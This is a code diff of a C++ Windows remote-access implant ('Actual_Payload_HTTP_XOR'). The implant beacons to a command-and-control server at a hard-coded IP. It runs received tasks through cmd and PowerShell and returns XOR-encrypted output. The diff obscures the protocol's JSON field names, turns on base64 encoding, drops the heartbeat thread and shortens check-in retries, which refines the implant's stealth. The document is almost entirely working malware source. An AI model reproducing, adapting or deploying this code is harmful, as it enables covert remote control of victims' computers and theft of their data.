@@ -1,4 +1,4 @@
-// x86_64-w64-mingw32-g++ -std=c++17 -o  Actual_Payload_HTTP_XOR.exe  Actual_Payload_HTTP_XOR.cpp -static -lwinhttp -lws2_32 -lgdi32 -static-libgcc -static-libstdc++
+// x86_64-w64-mingw32-g++ -std=c++17 -o Actual_Payload_HTTP_XOR.exe Actual_Payload_HTTP_XOR.cpp -static -lwinhttp -lws2_32 -lgdi32 -static-libgcc -static-libstdc++
 
 #include <windows.h>
 #include <winhttp.h>
@@ -18,10 +18,10 @@
 #pragma comment(lib, "winhttp.lib")
 
 const std::string SERVER_IP = "192.168.1.107";
-const int SERVER_PORT = 443;
-const std::string AUTH_ID = "2f729677-ce36-4c3f-a1fc-6433278ad37b";
+const int SERVER_PORT = 2222;
+const std::string AUTH_ID = "df7214d2-02e2-4f9e-b297-872444044a37";
 const int XOR_KEY = 11;
-const bool STATUS_BASE64 = false;
+const bool STATUS_BASE64 = true;
 
 const std::string DEFAULT_USER_AGENT = "Mozilla/5.0";
 std::string PREPEND_OUTPUT = "";
@@ -36,7 +36,7 @@ double sleep_time = 60.0;
 int start_jitter = 0;
 int end_jitter = 0;
 
-bool heartbeat_running = true;
+
 
 namespace base64 {
     static const std::string chars_urlsafe = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
@@ -372,11 +372,10 @@ std::string run_cmd_command(const std::string& cmd) {
 }
 
 std::string run_powershell_command(const std::string& ps_cmd) {
-    
     std::string escaped_cmd;
     for (char c : ps_cmd) {
         if (c == '"') {
-            escaped_cmd += "\\\""; 
+            escaped_cmd += "\\\"";
         } else {
             escaped_cmd += c;
         }
@@ -401,7 +400,6 @@ std::string run_powershell_command(const std::string& ps_cmd) {
     si.hStdOutput = hStdoutWr;
     si.hStdError = hStdoutWr;
 
-    
     std::string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
     
     std::vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
@@ -474,7 +472,7 @@ bool checkin(std::mt19937& gen) {
             return false;
         }
         
-        std::string enc_session = get_json_value(response, "session_id");
+        std::string enc_session = get_json_value(response, "sid");
         if (enc_session.empty()) {
             return false;
         }
@@ -484,7 +482,7 @@ bool checkin(std::mt19937& gen) {
             return false;
         }
         
-        std::string enc_ua = get_json_value(response, "user_agent");
+        std::string enc_ua = get_json_value(response, "ua");
         if (!enc_ua.empty()) {
             std::string ua = xor_decrypt_base64_string(enc_ua, XOR_KEY);
             if (!ua.empty()) {
@@ -492,9 +490,9 @@ bool checkin(std::mt19937& gen) {
             }
         }
         
-        std::string enc_start = get_json_value(response, "start_jitter");
-        std::string enc_end = get_json_value(response, "end_jitter");
-        std::string enc_sleep = get_json_value(response, "Sleep");
+        std::string enc_start = get_json_value(response, "sj");
+        std::string enc_end = get_json_value(response, "ej");
+        std::string enc_sleep = get_json_value(response, "sl");
         
         try {
             if (!enc_start.empty()) {
@@ -519,7 +517,7 @@ bool checkin(std::mt19937& gen) {
 
         }
         
-        std::vector<std::string> uris_raw = get_json_array(response, "uris");
+        std::vector<std::string> uris_raw = get_json_array(response, "ur");
         std::vector<std::string> uris_dec;
         for (const auto& u : uris_raw) {
             std::string dec = xor_decrypt_base64_string(u, XOR_KEY);
@@ -531,13 +529,13 @@ bool checkin(std::mt19937& gen) {
             uris = uris_dec;
         }
         
-        std::string enc_prepend = get_json_value(response, "prepend_output");
-        std::string enc_append = get_json_value(response, "append_output");
+        std::string enc_prepend = get_json_value(response, "pre");
+        std::string enc_append = get_json_value(response, "app");
         PREPEND_OUTPUT = xor_decrypt_base64_string(enc_prepend, XOR_KEY);
         APPEND_OUTPUT = xor_decrypt_base64_string(enc_append, XOR_KEY);
         
-        std::string enc_get_headers = get_json_value(response, "get_client_headers");
-        std::string enc_post_headers = get_json_value(response, "post_client_headers");
+        std::string enc_get_headers = get_json_value(response, "gh");
+        std::string enc_post_headers = get_json_value(response, "ph");
         
         GET_CLIENT_HEADERS = parse_headers(xor_decrypt_base64_string(enc_get_headers, XOR_KEY));
         POST_CLIENT_HEADERS = parse_headers(xor_decrypt_base64_string(enc_post_headers, XOR_KEY));
@@ -553,7 +551,7 @@ std::string get_tasks(std::mt19937& gen) {
         return "";
     }
     
-    std::string payload = "{\"action\":\"get_tasks\",\"session_id\":\"" + 
+    std::string payload = "{\"action\":\"get_tasks\",\"sid\":\"" + 
                          xor_encrypt_decrypt_string(session_id, XOR_KEY) + "\"}";
     
     try {
@@ -583,9 +581,11 @@ void submit_output(const std::string& output, std::mt19937& gen) {
     std::string encrypted_output = xor_encrypt_decrypt_string(output, XOR_KEY);
     std::string final_output = PREPEND_OUTPUT + encrypted_output + APPEND_OUTPUT;
     
-    std::string payload = "{\"action\":\"submit\",\"session_id\":\"" + 
+
+    
+    std::string payload = "{\"action\":\"submit\",\"sid\":\"" + 
                          xor_encrypt_decrypt_string(session_id, XOR_KEY) + 
-                         "\",\"output\":\"" + encrypted_output + "\"}";
+                         "\",\"out\":\"" + encrypted_output + "\"}";
     
     try {
         http_request(get_url(gen), payload, true);
@@ -594,31 +594,7 @@ void submit_output(const std::string& output, std::mt19937& gen) {
     }
 }
 
-void heartbeat(std::mt19937& gen) {
-    if (session_id.empty()) return;
-    
-    std::string payload = "{\"action\":\"heartbeat\",\"session_id\":\"" + 
-                         xor_encrypt_decrypt_string(session_id, XOR_KEY) + "\"}";
-    
-    try {
-        http_request(get_url(gen), payload, true);
-    } catch (...) {
 
-    }
-}
-
-void heartbeat_thread() {
-    std::random_device rd;
-    std::mt19937 gen(rd());
-    std::uniform_real_distribution<> dis(-15.0, 30.0);
-    
-    while (heartbeat_running) {
-        heartbeat(gen);
-        
-        double sleep_duration = 45.0 + dis(gen);
-        std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<long long>(sleep_duration * 1000)));
-    }
-}
 
 void apply_jitter(std::mt19937& gen) {
     int actual_start = start_jitter;
@@ -641,15 +617,13 @@ void main_loop() {
     std::random_device rd;
     std::mt19937 gen(rd());
     
-    std::thread hb_thread(heartbeat_thread);
-    hb_thread.detach();
-    
+
     while (session_id.empty()) {
         if (checkin(gen)) {
             break;
         }
         
-        std::uniform_real_distribution<> dis(20.0, 60.0);
+        std::uniform_real_distribution<> dis(1.0, 2.0);
         double wait_time = dis(gen);
         std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<long long>(wait_time * 1000)));
     }
